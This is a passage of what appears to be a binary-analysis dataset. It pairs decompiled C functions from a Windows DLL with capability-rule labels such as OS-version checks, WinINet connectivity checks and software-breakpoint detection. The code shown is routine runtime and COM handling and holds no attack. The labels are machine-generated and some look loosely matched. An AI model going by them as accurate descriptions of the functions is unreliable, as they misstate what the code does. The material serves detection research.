var_90h;\n    ulong var_c0h;\n    ulong var_c8h;\n    ulong var_d0h;\n    ulong uStack272;\n    uchar auStack264 [80];\n    uchar auStack184 [8];\n    uchar *puStack176;\n    ulong uStack168;\n    int32_t iStack160;\n    uchar *puStack152;\n    ulong uStack144;\n    ulong uStack136;\n    ulong uStack128;\n    ulong *puStack120;\n    int64_t iStack112;\n    code *pcStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    ulong uStack64;\n    uint64_t uStack48;\n    \n    puVar10 = &stack0xfffffffffffffef8;\n    uStack64 = 0xfffffffffffffffe;\n    uStack48 = *0x180067ce0 ^ &stack0xffffffffffffff48;\n    uStack272 = 0x1800303ef;\n    puStack120 = arg4;\n    iStack112 = arg1;\n    fcn.1800140d4(&stack0xffffffffffffff58, *(arg1 + 0x38));\n    piVar12 = NULL;\n    auStack184[0] = 0;\n    puStack176 = &stack0xffffffffffffff48;\n    if (*(arg2 + 0x10) != 0) {\n        puStack176 = *(arg2 + 0x10);\n    }\n    uStack272 = 0x180030410;\n    uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    arg1_02 = *(arg2 + 0x20);\n    uVar14 = *(arg2 + 0x18);\n    if ((noname_2 & 0xc) != 0) {\n        uStack272 = 0x180030432;\n        cVar4 = fcn.18000a34c(uVar5 + 3);\n        if (cVar4 == '\\0') {\n            puVar11 = &stack0xfffffffffffffef8;\n            if (iStack160 != 0) {\n                uStack272 = 0x180030447;\n                fcn.18001357c(0, uStack168);\n                puVar11 = &stack0xfffffffffffffef8;\n            }\n            goto code_r0x0001800308a4;\n        }\n        uStack272 = 0x18003047c;\n        iVar7 = fcn.180047db0();\n        puVar3 = puStack176;\n        iVar7 = -iVar7;\n        puVar10 = &stack0xfffffffffffffef8 + iVar7;\n        puVar11 = &stack0xffffffffffffff48 + iVar7;\n        *(&stack0xfffffffffffffef0 + iVar7) = 0x180030496;\n        iVar6 = fcn.180034220(puVar11, uVar5 + 3, puVar3, uVar5);\n        if (iVar6 != 0) {\n            if (iVar6 == 0xc) {\n                *(&stack0xfffffffffffffef0 + iVar7) = 0x1800304bf;\n                fcn.1800124cc();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if ((iVar6 == 0x16) || (iVar6 == 0x22)) {\n                *(&stack0xfffffffffffffef0 + iVar7) = 0x1800304b9;\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if (iVar6 != 0x50) {\n                *(&stack0xfffffffffffffef0 + iVar7) = 0x1800304b3;\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        puStack176 = puVar11;\n        uVar1 = *(arg2 + 0x18);\n        puVar11[uVar5] = 0xff;\n        puVar11[uVar5 + 1] = uVar1;\n        puVar11[uVar5 + 2] = 0;\n        arg1_02 = *(arg2 + 0x28);\n        uVar14 = 0;\n    }\n    uVar5 = *(noname_4 + 0x10);\n    *(puVar10 + -8) = 0x180030508;\n    cVar4 = fcn.18000a34c(uVar5 * 0x18);\n    puVar11 = puVar10;\n    if (cVar4 == '\\0') {\n        if (iStack160 != 0) {\n            *(puVar10 + -8) = 0x18003051d;\n            fcn.18001357c(0, uStack168);\n        }\n        goto code_r0x0001800308a4;\n    }\n    if (0x5555555 < *(noname_4 + 0x10)) {\n        if (iStack160 != 0) {\n            *(puVar10 + -8) = 0x180030542;\n            fcn.18001357c(0, uStack168);\n        }\n        goto code_r0x0001800308a4;\n    }\n    iVar13 = *(noname_4 + 0x10) * 0x18;\n    *(puVar10 + -8) = 0x18003056e;\n    iVar7 = fcn.180047db0();\n    iVar7 = -iVar7;\n    puStack152 = puVar10 + iVar7 + 0x50;\n    *(puVar10 + iVar7 + -8) = 0x180030584;\n    fcn.180033c90(puVar10 + iVar7 + 0x50, 0, iVar13);\n    puVar11 = puStack176;\n    *(puVar10 + iVar7 + -8) = 0x180030591;\n    iVar6 = fcn.18002fd78(puVar11);\n    *(puVar10 + iVar7 + -8) = 0x18003059f;\n    cVar4 = fcn.18000a34c(iVar6 + 0x20);\n    if (cVar4 == '\\0') {\n        puVar11 = puVar10 + iVar7;\n        if (iStack160 != 0) {\n            *(puVar10 + iVar7 + -8) = 0x1800305b4;\n            fcn.18001357c(0, uStack168);\n            puVar11 = puVar10 + iVar7;\n        }\n        goto code_r0x0001800308a4;\n    }\n    *(puVar10 + iVar7 + -8) = 0x1800305d4;\n    iVar13 = fcn.180047db0();\n    iVar13 = -iVar13;\n    puVar11 = puVar10 + iVar13 + iVar7 + 0x50;\n    pcStack104 = vtable.CArray_class_CVariantBoolPair__class_CVariantBoolPair_const____ptr64_.0;\n    uStack96 = 0;\n    uStack72 = 0;\n    uStack80 = 0;\n    uStack88 = 0;\n    *(puVar10 + iVar13 + iVar7 + 0x40) = &stack0xffffffffffffff98;\n    *(puVar10 + iVar13 + iVar7 + 0x38) = puStack152;\n    *(puVar10 + iVar13 + iVar7 + 0x30) = noname_5;\n    *(puVar10 + iVar13 + iVar7 + 0x28) = noname_4;\n    *(puVar10 + iVar13 + iVar7 + 0x20) = uVar14;\n    arg1_00 = iStack112;\n    puVar3 = puStack176;\n    *(puVar10 + iVar13 + iVar7 + -8) = 0x18003063b;\n    uVar5 = fcn.18002ff68(arg1_00, puVar11, puVar3, &stack0xffffffffffffff70);\n    puStack176 = puStack176 & 0xffffffff00000000 | uVar5;\n    piVar9 = NULL;\n    piVar8 = piVar12;\n    if (uVar5 == 0) {\n        piVar8 = piVar9;\n        if (uVar14 == 4) {\n            *(puVar10 + iVar13 + iVar7 + -8) = 0x1800306bf;\n            uVar15 = fcn.180032ac0(arg1_02, puVar11);\n            uStack144 = CONCAT44(uStack144._4_4_, uVar15);\n        }\n        else if (uVar14 == 5) {\n            *(puVar10 + iVar13 + iVar7 + -8) = 0x1800306aa;\n            uStack144 = fcn.180032ac0(arg1_02, puVar11);\n        }\n        else if (uVar14 == 7) {\n            *(puVar10 + iVar13 + iVar7 + -8) = 0x180030695;\n            uStack144 = fcn.180032ac0(arg1_02, puVar11);\n        }\n        else if (uVar14 - 0x14 < 2) {\n            *(puVar10 + iVar13 + iVar7 + -8) = 0x18003066e;\n            uStack144 = fcn.180032ac0(arg1_02, puVar11);\n            piVar8 = piVar12;\n        }\n        else {\n            *(puVar10 + iVar13 + iVar7 + -8) = 0x180030682;\n            piVar8 = fcn.180032ac0(arg1_02, puVar11);\n        }\n    }\n    puVar11 = puStack152;\n    if (*(noname_4 + 0x10) != 0) {\n        do {\n            *(puVar10 + iVar13 + iVar7 + -8) = 0x1800306e9;\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)(puVar11 + piVar12 * 0x18);\n            uVar5 = piVar12 + 1;\n            piVar12 = uVar5;\n            arg4 = puStack120;\n        } while (uVar5 < *(noname_4 + 0x10));\n    }\n    if (puStack176 != 0) {\n        *(puVar10 + iVar13 + iVar7 + -8) = 0x180030708;\n        fcn.18002e148(&stack0xffffffffffffff98);\n        puVar11 = puVar10 + iVar13 + iVar7;\n        if (iStack160 != 0) {\n            *(puVar10 + iVar13 + iVar7 + -8) = 0x180030719;\n            fcn.18001357c(0, uStack168);\n            puVar11 = puVar10 + iVar13 + iVar7;\n        }\n        goto code_r0x0001800308a4;\n    }\n    *(puVar10 + iVar13 + iVar7 + -8) = 0x18003072a;\n    fcn.18002fe54(&stack0xffffffffffffff98);\n    if (arg4 == NULL) {\n        if (uVar14 == 8) {\n            *(puVar10 + iVar13 + iVar7 + -8) = 0x180030887;\n            (*_sym.imp.OLEAUT32.dll_SysStringLen)(piVar8);\n        }\n        else if (uVar14 == 9) {\ncode_r0x00018003086e:\n            if (piVar8 != NULL) {\n                pcVar2 = *(*piVar8 + 0x10);\n                *(puVar10 + iVar13 + iVar7 + -8) = 0x18003087c;\n                (*pcVar2)(piVar8);\n            }\n        }\n        else if (uVar14 == 0xc) {\n            *(puVar10 + iVar13 + iVar7 + -8) = 0x18003086c;\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)(&stack0xffffffffffffff70);\n        }\n        else if (uVar14 == 0xd) goto code_r0x00018003086e;\n    }\n    else {\n        *arg4 = uVar14;\n        if (uVar14 < 0xb) {\n            if (uVar14 == 10) {\n                *(arg4 + 1) = piVar8;\n            }\n            else if (uVar14 == 2) {\ncode_r0x00018003080f:\n                *(arg4 + 1) = piVar8;\n            }\n            else if (uVar14 == 3) {\ncode_r0x00018003080a:\n                *(arg4 + 1) = piVar8;\n            }\n            else if (uVar14 == 4) {\n                *(arg4 + 1) = uStack144;\n            }\n            else if (uVar14 == 5) {\n                arg4[1] = uStack144;\n            }\n            else if (uVar14 == 6) {\n                arg4[1] = uStack144;\n            }\n            else if (uVar14 == 7) {\n                arg4[1] = uStack144;\n            }\n            else if (uVar14 == 8) {\n                arg4[1] = piVar8;\n            }\n            else if (uVar14 == 9) goto code_r0x00018003081a;\n        }\n        else if (uVar14 == 0xb) {\n            *(arg4 + 1) = -(piVar8 != 0);\n        }\n        else if (uVar14 == 0xc) {\n            *arg4 = uStack144;\n            arg4[1] = uStack136;\n            arg4[2] = uStack128;\n        }\n        else if (uVar14 == 0xd) {\ncode_r0x00018003081a:\n            arg4[1] = piVar8;\n        }\n        else if (0xf < uVar14) {\n            if (uVar14 < 0x12) {\n                *(arg4 + 1) = piVar8;\n            }\n            else {\n                if (uVar14 == 0x12) goto code_r0x00018003080f;\n                if (uVar14 == 0x13) goto code_r0x00018003080a;\n                if (uVar14 - 0x14 < 2) {\n                    arg4[1] = uStack144;\n                }\n            }\n        }\n    }\n    *(puVar10 + iVar13 + iVar7 + -8) = 0x180030891;\n    fcn.18002e148(&stack0xffffffffffffff98);\n    puVar11 = puVar10 + iVar13 + iVar7;\n    if (iStack160 != 0) {\n        *(puVar10 + iVar13 + iVar7 + -8) = 0x1800308a2;\n        fcn.18001357c(0, uStack168);\n        puVar11 = puVar10 + iVar13 + iVar7;\n    }\ncode_r0x0001800308a4:\n    arg1_01 = uStack48 ^ &stack0xffffffffffffff48;\n    *(puVar11 + -8) = 0x1800308b3;\n    fcn.180032ea0(arg1_01);\n    return;\n}\n",
        "token_count": 3884
    },
    "1800309f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.1800309fc(ushort *arg1, int64_t arg2)\n\n{\n    int64_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int64_t **ppiVar4;\n    ulong uVar5;\n    ulong *puVar6;\n    int64_t iVar7;\n    uchar *arg2_00;\n    uchar auStack632 [32];\n    int64_t iStack600;\n    int64_t iStack592;\n    int64_t iStack584;\n    int64_t **ppiStack576;\n    int64_t **ppiStack568;\n    uchar auStack552 [512];\n    uint64_t uStack40;\n    \n    uStack40 = *0x180067ce0 ^ auStack632;\n    fcn.180033c90(arg1, 0, 0x40);\n    arg2_00 = auStack552;\n    iVar3 = fcn.18001c9b0(arg2, 0x180053318);\n    if (iVar3 == 0) {\n        iVar3 = fcn.18001c9b0(arg2, 0x18004ed40);\n        uVar5 = 0xf10a;\n        if (iVar3 == 0) {\n            uVar5 = 0xf108;\n        }\n        fcn.180012228(uVar5, auStack552, 0x100);\n        *arg1 = uVar5;\n    }\n    else {\n        arg2_00 = *(arg2 + 0x18);\n        *arg1 = *(arg2 + 0x10);\n        *(arg1 + 0x10) = *(arg2 + 0x20);\n        *(arg1 + 0x1c) = *(arg2 + 0x38);\n        if (*(*(arg2 + 0x28) + -0x10) != 0) {\n            ppiVar4 = fcn.180008f18(*(arg2 + 0x28) + -0x18);\n            ppiStack576 = ppiVar4 + 3;\n            uVar5 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(ppiStack576);\n            *(arg1 + 0xc) = uVar5;\n            LOCK();\n            ppiVar1 = ppiVar4 + 2;\n            iVar3 = *ppiVar1;\n            *ppiVar1 = *ppiVar1 + -1;\n            if (iVar3 + -1 < 1) {\n                (**(**ppiVar4 + 8))();\n            }\n        }\n        if (*(*(arg2 + 0x30) + -0x10) != 0) {\n            ppiVar4 = fcn.180008f18(*(arg2 + 0x30) + -0x18);\n            ppiStack568 = ppiVar4 + 3;\n            uVar5 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(ppiStack568);\n            *(arg1 + 4) = uVar5;\n            LOCK();\n            ppiVar1 = ppiVar4 + 2;\n            iVar3 = *ppiVar1;\n            *ppiVar1 = *ppiVar1 + -1;\n            if (iVar3 + -1 < 1) {\n                (**(**ppiVar4 + 8))();\n            }\n        }\n    }\n    puVar6 = fcn.1800087c4(&iStack584, arg2_00);\n    uVar5 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(*puVar6);\n    *(arg1 + 8) = uVar5;\n    LOCK();\n    piVar2 = iStack584 + -8;\n    iVar3 = *piVar2;\n    *piVar2 = *piVar2 + -1;\n    if (iVar3 + -1 < 1) {\n        (**(**(iStack584 + -0x18) + 8))();\n    }\n    if (*(arg1 + 4) == 0) {\n        iVar7 = fcn.180014058();\n        puVar6 = fcn.1800087c4(&iStack592, *(iVar7 + 0x20));\n        uVar5 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(*puVar6);\n        *(arg1 + 4) = uVar5;\n        LOCK();\n        piVar2 = iStack592 + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n        if (iVar3 + -1 < 1) {\n            (**(**(iStack592 + -0x18) + 8))();\n        }\n    }\n    if ((*(arg1 + 0xc) == 0) && (*(arg1 + 0x10) != 0)) {\n        iVar7 = fcn.180014058();\n        puVar6 = fcn.1800087c4(&iStack600, *(*(iVar7 + 8) + 200));\n        uVar5 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(*puVar6);\n        *(arg1 + 0xc) = uVar5;\n        LOCK();\n        piVar2 = iStack600 + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n        if (iVar3 + -1 < 1) {\n            (**(**(iStack600 + -0x18) + 8))();\n        }\n    }\n    fcn.180032ea0(uStack40 ^ auStack632);\n    return;\n}\n",
        "token_count": 1233
    },
    "180030f5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t * fcn.180030f5c(uint32_t *arg1, ulong arg2, ulong arg3)\n\n{\n    if (arg2 < 8) {\n        arg2._0_4_ = 8;\n    }\n    if (arg3 < 2) {\n        arg3._0_4_ = 0x40;\n    }\n    *(arg1 + 4) = 0;\n    *(arg1 + 2) = 0;\n    arg1[1] = arg3;\n    *arg1 = arg2;\n    return arg1;\n}\n",
        "token_count": 127
    },
    "180030fb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180030fb4(uint32_t *arg1)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    \n    if (*(arg1 + 4) == 0) {\n        iVar2 = fcn.18002a0c8(arg1 + 2, arg1[1], *arg1);\n        uVar1 = arg1[1];\n        puVar3 = iVar2 + 8 + (uVar1 - 1) * *arg1;\n        while (uVar1 = uVar1 - 1,  -1 < uVar1) {\n            *puVar3 = *(arg1 + 4);\n            *(arg1 + 4) = puVar3;\n            puVar3 = puVar3 - *arg1;\n        }\n    }\n    *(arg1 + 4) = **(arg1 + 4);\n    return;\n}\n",
        "token_count": 203
    },
    "18003214": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180032144(int64_t arg1)\n\n{\n    if (*(arg1 + 0x7a) != '\\0') {\n        if (*(arg1 + 0x48) != 0) {\n            (*_sym.imp.ole32.dll_CoRevokeClassObject)();\n            *(arg1 + 0x48) = 0;\n        }\n        *(arg1 + 0x7a) = 0;\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "18003229": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180032294(int64_t arg1)\n\n{\n    if (*(arg1 + 0x40) != 0) {\n        (*_sym.imp.ole32.dll_CoRegisterMessageFilter)(0, 0);\n        *(arg1 + 0x40) = 0;\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "1800333a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000180033360)\n\nint64_t fcn.1800333ac(int32_t *arg1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    int32_t aiStackX8 [4];\n    int32_t aiStackX24 [2];\n    int64_t iStackX32;\n    uchar auStack72 [32];\n    int32_t iStack40;\n    \n    aiStackX24[0] = 0;\n    aiStackX8[0] = 0;\n    if (arg1 == NULL) {\n        puVar2 = fcn.180035b28();\n        *puVar2 = 0x16;\n        fcn.180036f3c(0, 0, 0, 0);\n        return -1;\n    }\n    iStackX32 = arg1[5];\n    if (iStackX32 - 0x45U < 0x409) {\n        iVar1 = arg1[4];\n        if ((iVar1 < 0) || (0xb < iVar1)) {\n            iVar3 = iVar1 % 0xc;\n            iStackX32 = iStackX32 + iVar1 / 0xc;\n            arg1[4] = iVar3;\n            if (iVar3 < 0) {\n                iStackX32 = iStackX32 + -1;\n                arg1[4] = iVar3 + 0xc;\n            }\n            if (0x408 < iStackX32 - 0x45U) goto code_r0x000180033393;\n        }\n        iVar8 = *(arg1[4] * 4 + 0x180067f88);\n        uVar4 = iStackX32 >> 0x3f & 3;\n        if (((((iStackX32 + uVar4 & 3) == uVar4) &&\n             (iVar5 = SUB168(SEXT816(-0x5c28f5c28f5c28f5) * SEXT816(iStackX32) >> 0x40, 0) + iStackX32, \n             iStackX32 != ((iVar5 >> 6) - (iVar5 >> 0x3f)) * 100)) ||\n            (iVar5 = iStackX32 + 0x76c, \n            iVar6 = SUB168(SEXT816(-0x5c28f5c28f5c28f5) * SEXT816(iVar5) >> 0x40, 0) + iVar5, \n            iVar5 == ((iVar6 >> 8) - (iVar6 >> 0x3f)) * 400)) && (1 < arg1[4])) {\n            iVar8 = iVar8 + 1;\n        }\n        iVar5 = iStackX32 + -1;\n        iVar6 = iStackX32 + 299 + SUB168(SEXT816(-0x5c28f5c28f5c28f5) * SEXT816(iStackX32 + 299) >> 0x40, 0);\n        iVar7 = SUB168(SEXT816(-0x5c28f5c28f5c28f5) * SEXT816(iVar5) >> 0x40, 0) + iVar5;\n        iStackX32 = *arg1 + (arg1[1] +\n                            (arg1[2] +\n                            (iStackX32 * 0x16d + -0x63df +\n                            (iVar5 + (iVar5 >> 0x3f & 3) >> 2) + iVar8 +\n                            ((((iVar6 >> 8) - (iVar6 >> 0x3f)) + arg1[3]) - ((iVar7 >> 6) - (iVar7 >> 0x3f)))) * 0x18) *\n                            0x3c) * 0x3c;\n        fcn.180037d6c();\n        iVar1 = fcn.1800372d0(aiStackX24);\n        if (iVar1 != 0) {\n            fcn.180036e14(0, 0, 0, 0, 0);\n        }\n        iVar1 = fcn.180037310(aiStackX8);\n        if (iVar1 != 0) {\n            fcn.180036e14(0, 0, 0, 0, 0);\n        }\n        iStackX32 = iStackX32 + aiStackX8[0];\n        iVar1 = fcn.180033524(auStack72, &iStackX32);\n        if (iVar1 == 0) {\n            if ((0 < arg1[8]) || ((arg1[8] < 0 && (0 < iStack40)))) {\n                iStackX32 = iStackX32 + aiStackX24[0];\n                iVar1 = fcn.180033524(auStack72, &iStackX32);\n                if (iVar1 != 0) goto code_r0x000180033393;\n            }\n            fcn.180035e40(arg1, auStack72, 0x24);\n            return iStackX32;\n        }\n    }\ncode_r0x000180033393:\n    puVar2 = fcn.180035b28();\n    *puVar2 = 0x16;\n    return -1;\n}\n",
        "token_count": 1218
    },
    "18003599": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000180035950)\n\nvoid fcn.18003599c(void)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    int64_t *piVar5;\n    int64_t *piVar6;\n    int64_t *piVar7;\n    int64_t *piVar8;\n    \n    fcn.180040568(8, 0);\n    if (*0x18006d430 != 1) {\n        *0x18006d42c = 1;\n        *0x18006d428 = 1;\n        piVar1 = sub.KERNEL32.dll_DecodePointer(*0x18006f6d0);\n        if (piVar1 != NULL) {\n            piVar2 = sub.KERNEL32.dll_DecodePointer(*0x18006f6c8);\n            piVar7 = piVar2;\n            piVar8 = piVar1;\ncode_r0x00018003589a:\n            piVar2 = piVar2 + -1;\n            if (piVar1 <= piVar2) goto code_r0x0001800358a8;\n            goto code_r0x0001800358b4;\n        }\ncode_r0x000180035915:\n        fcn.1800356e4(0x18004cc60, 0x18004cc78);\n        fcn.1800356e4(0x18004cc80, 0x18004cc88);\n    }\n    fcn.180040468(8);\n    return;\ncode_r0x0001800358a8:\n    iVar3 = fcn.180036804();\n    if (*piVar2 != iVar3) {\ncode_r0x0001800358b4:\n        if (piVar1 <= piVar2) {\n            pcVar4 = sub.KERNEL32.dll_DecodePointer(*piVar2);\n            iVar3 = fcn.180036804();\n            *piVar2 = iVar3;\n            (*pcVar4)();\n            piVar5 = sub.KERNEL32.dll_DecodePointer(*0x18006f6d0);\n            piVar6 = sub.KERNEL32.dll_DecodePointer(*0x18006f6c8);\n            if ((piVar8 != piVar5) || (piVar7 != piVar6)) {\n                piVar1 = piVar5;\n                piVar2 = piVar6;\n                piVar7 = piVar6;\n                piVar8 = piVar5;\n            }\n            goto code_r0x00018003589a;\n        }\n        goto code_r0x000180035915;\n    }\n    goto code_r0x00018003589a;\n}\n",
        "token_count": 603
    },
    "18003664": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.180036640(uint64_t param_1)\n\n{\n    uint64_t uVar1;\n    uint16_t auStackX8 [16];\n    \n    auStackX8[0] = param_1;\n    if (auStackX8[0] == 0xffff) {\n        uVar1 = 0;\n    }\n    else if (auStackX8[0] < 0x100) {\n        uVar1 = *(*0x1800690b8 + (param_1 & 0xffff) * 2) & 8;\n    }\n    else {\n        if (*0x18006de08 == 0) {\n            fcn.180043254(0x180068bc0, 1, auStackX8, 1);\n            param_1 = auStackX8[0];\n        }\n        uVar1 = fcn.18003dd7c(param_1, 8, 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 217
    },
    "180041ab": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.180041ab4(uint16_t *arg1, uint8_t *arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int64_t aiStack40 [2];\n    int64_t iStack24;\n    char cStack16;\n    \n    if ((arg2 != NULL) && (arg3 != 0)) {\n        if (*arg2 != 0) {\n            fcn.180033d7c(aiStack40, arg4);\n            if (*(aiStack40[0] + 0x14) != 0) {\n                iVar2 = fcn.1800365a4(*arg2, aiStack40);\n                if (iVar2 == 0) {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                      (*(aiStack40[0] + 4), 9, arg2, 1, arg1, arg1 != NULL);\n                    if (iVar2 != 0) goto code_r0x000180041b24;\n                }\n                else {\n                    iVar2 = *(aiStack40[0] + 0x10c);\n                    if ((((1 < iVar2) && (iVar2 <= arg3)) &&\n                        (iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                           (*(aiStack40[0] + 4), 9, arg2, iVar2, arg1, arg1 != NULL),  iVar2 != 0)) ||\n                       ((*(aiStack40[0] + 0x10c) <= arg3 && (arg2[1] != 0)))) {\n                        uVar1 = *(aiStack40[0] + 0x10c);\n                        if (cStack16 == '\\0') {\n                            return uVar1;\n                        }\n                        *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n                        return uVar1;\n                    }\n                }\n                puVar3 = fcn.180035b28();\n                *puVar3 = 0x2a;\n                if (cStack16 != '\\0') {\n                    *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n                }\n                return 0xffffffff;\n            }\n            if (arg1 != NULL) {\n                *arg1 = *arg2;\n            }\ncode_r0x000180041b24:\n            if (cStack16 != '\\0') {\n                *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n            }\n            return 1;\n        }\n        if (arg1 != NULL) {\n            *arg1 = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 611
    },
    "1800432b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint64_t fcn.1800432b8(uint16_t *arg1, uint32_t *arg2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint8_t uVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint64_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int64_t iVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    int32_t iVar17;\n    uint32_t auStack88 [4];\n    uint32_t uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    \n    uVar1 = arg1[5];\n    uVar15 = 0;\n    uVar10 = 1;\n    uVar11 = uVar1 & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    auStack88[0] = *(arg1 + 3);\n    auStack88[1] = *(arg1 + 1);\n    auStack88[2] = *arg1 << 0x10;\n    iVar4 = 0;\n    uVar5 = uVar15;\n    if (iVar12 == -0x3fff) {\n        do {\n            if (auStack88[uVar5] != 0) {\n                auStack88[0] = 0;\n                auStack88[1] = 0;\n                uVar15 = 2;\n                break;\n            }\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < 3);\n    }\n    else {\n        uStack72 = *(arg1 + 3);\n        uStack68 = *(arg1 + 1);\n        iStack64 = *arg1 << 0x10;\n        uVar9 = str.5_v_[0] >> 0x1f & 0x1f;\n        uVar3 = str.5_v_[0] + uVar9;\n        iVar17 = uVar3 >> 5;\n        uVar3 = 0x1f - ((uVar3 & 0x1f) - uVar9);\n        uVar7 = uVar3;\n        if ((auStack88[iVar17] >> (uVar3 & 0x1f) & 1) != 0) {\n            if ((auStack88[iVar17] & ~(-1 << (uVar7 & 0x1f))) == 0) {\n                for (iVar6 = iVar17 + 1; iVar6 < 3; iVar6 = iVar6 + 1) {\n                    if (auStack88[iVar6] != 0) goto code_r0x0001800433c5;\n                }\n            }\n            else {\ncode_r0x0001800433c5:\n                uVar3 = str.5_v_[0] + L'\\xffffffff' >> 0x1f & 0x1f;\n                iVar4 = str.5_v_[0] + L'\\xffffffff' + uVar3;\n                iVar13 = iVar4 >> 5;\n                uVar9 = 1 << (0x1f - ((iVar4 & 0x1f) - uVar3) & 0x1f);\n                uVar3 = auStack88[iVar13] + uVar9;\n                if ((uVar3 < auStack88[iVar13]) || (uVar3 < uVar9)) {\n                    uVar5 = 1;\n                }\n                iVar4 = uVar5;\n                auStack88[iVar13] = uVar3;\n                iVar6 = iVar13 + -1;\n                while ((-1 < iVar6 && (iVar4 = uVar5,  iVar4 != 0))) {\n                    uVar3 = auStack88[iVar6] + 1;\n                    if ((uVar3 < auStack88[iVar6]) || (uVar5 = uVar15,  uVar3 == 0)) {\n                        uVar5 = uVar10;\n                    }\n                    iVar4 = uVar5;\n                    auStack88[iVar6] = uVar3;\n                    iVar6 = iVar6 + -1;\n                }\n            }\n        }\n        auStack88[iVar17] = auStack88[iVar17] & -1 << (uVar7 & 0x1f);\n        iVar6 = iVar17 + 1;\n        if (iVar6 < 3) {\n            fcn.180033c90(auStack88 + iVar6, 0, (3 - iVar6) * 